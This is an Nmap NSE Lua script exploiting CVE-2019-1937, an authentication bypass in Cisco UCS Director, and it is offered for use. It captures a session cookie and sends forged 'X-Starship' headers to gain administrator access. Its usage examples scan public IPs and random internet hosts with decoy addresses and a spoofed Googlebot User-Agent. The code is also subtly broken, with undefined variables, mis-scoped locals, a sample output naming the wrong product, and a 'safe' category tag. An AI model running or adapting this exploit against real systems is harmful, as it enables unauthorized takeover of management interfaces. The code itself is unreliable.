---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.1
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80-86,443,8080-8086
--
-- Affected versions: confirmed in Cisco UCS Director versions 6.6.0
-- and 6.7.0, see [2] for Cisco's list of affected versions
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80-86,443,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80-86,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
-- nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   ABB IDAL HTTP server CGI (Improper Authentication)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Higth  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: http://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginName: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display More verbose outputs      - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: iPhone,safari
-- @args uri => the URL path to search in host.ip     - Default: /cgi/loginDefaultUser
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 81, 82, 83, 84, 85, 86, 443, 8080, 8081, 8082, 8083, 8084, 8085, 8086}, "http, https, http-simple-new, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"


local ip_addr, vuln_state
-- Capture distro flavor (windows)
local socket = io.popen("ver")
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()

   -- Capture distro flavor (Linux)
   if ( flavor == nil or flavor == "" or string.find(flavor, "not found") ) then
      local socket = io.popen("uname -s")
      flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
      socket.close()
   end


   if (string.find(flavor, "Linux")) then
      -- Executing BASH command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
      local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
      socket:close()

      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
      ip_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from ip addr
      socket:close()
   else
      -- Executing CMD command(s) and storing results
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ipconfig|FINDSTR IPv4")
      ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", "")
      socket.close()
   end









-- Manipulate TCP packet 'header'
local _decoy = {header={}}   --> manipulate 'header' request ..
_decoy['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['Host'] = ip_addr
_decoy['header']['Referer'] = "http://"..ip_addr.."/"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"


-- Grab redirection full url to parse only the redirection url string
local response = http.get(host, port, uri, _decoy { no_cache = true, no_cache_body = true })
if ( not(response or response.status) ) then
   uri = "false"
elseif (response and response.status == 302) then
   local redirection = response.header and response.header['Location'] or "/app/ui/login.jsp"
   if ( not(redirection == nil or redirection == "") ) then
      uri = redirection:gsub("Location: https://", ""):gsub(ip_addr, "")
   else
      uri = "false"
   end
elseif (response and response.status ~= 302) then
   uri = "false"
end


-- Follow the redirection uri to capture Set-Cookie
-- eg. JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( not(uri == "false") ) then
   local res = http.get(host, port, uri, _decoy { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      return nil
   elseif (res and res.status == 200) then
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         local parse_cookie = set_cookie:gsub("Set-Cookie: ", ""):gsub("; Path=/app; Secure; HttpOnly", "")
         vuln_state = "Vulnerable"
      else
         vuln_state = "Not Vulnerable"
      end
   elseif (response and response.status ~= 200) then
      vuln_state = "Not Vulnerable"
   end
else
   uri = "false"
end



-- Manipulate TCP packet 'header'
if ( vuln_state == "Vulnerable" ) then
   local _send = {header={}}   --> manipulate 'header' request ..
   _send['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
   _send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
   _send['header']['Cache-Control'] = "no-store"
   _send['header']['Host'] = ip_addr
   _send['header']['Referer'] = "http://"..ip_addr.."/"
   _send['header']['X-Requested-With'] = "XMLHttpRequest"
   _send['header']['X-Starship-UserSession-Key'] = "ssa"
   _send['header']['X-Starship-Request-Key'] = "redteam"
   _send['header']['Cookie'] = parse_cookie..";"

   local vuln_test = http.get(host, port, uri, _send { no_cache = true, no_cache_body = true })
   if (vuln_test.status == 200) then
      table.insert(vuln_table.exploit_results, "VULNERABLE OUTPUT")
   else
      return "NOT VULNERABLE SERVER"
   end
end








   -- Print Internal ip address captured (develop stage)..
   -- Build header['Referer'] string based on host.ip - port.number
   if (port.number == 443) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: https://"..ip_addr.."/\n\n"
   elseif (port.number == 80 or port.number == 8080) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   else
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   end
end
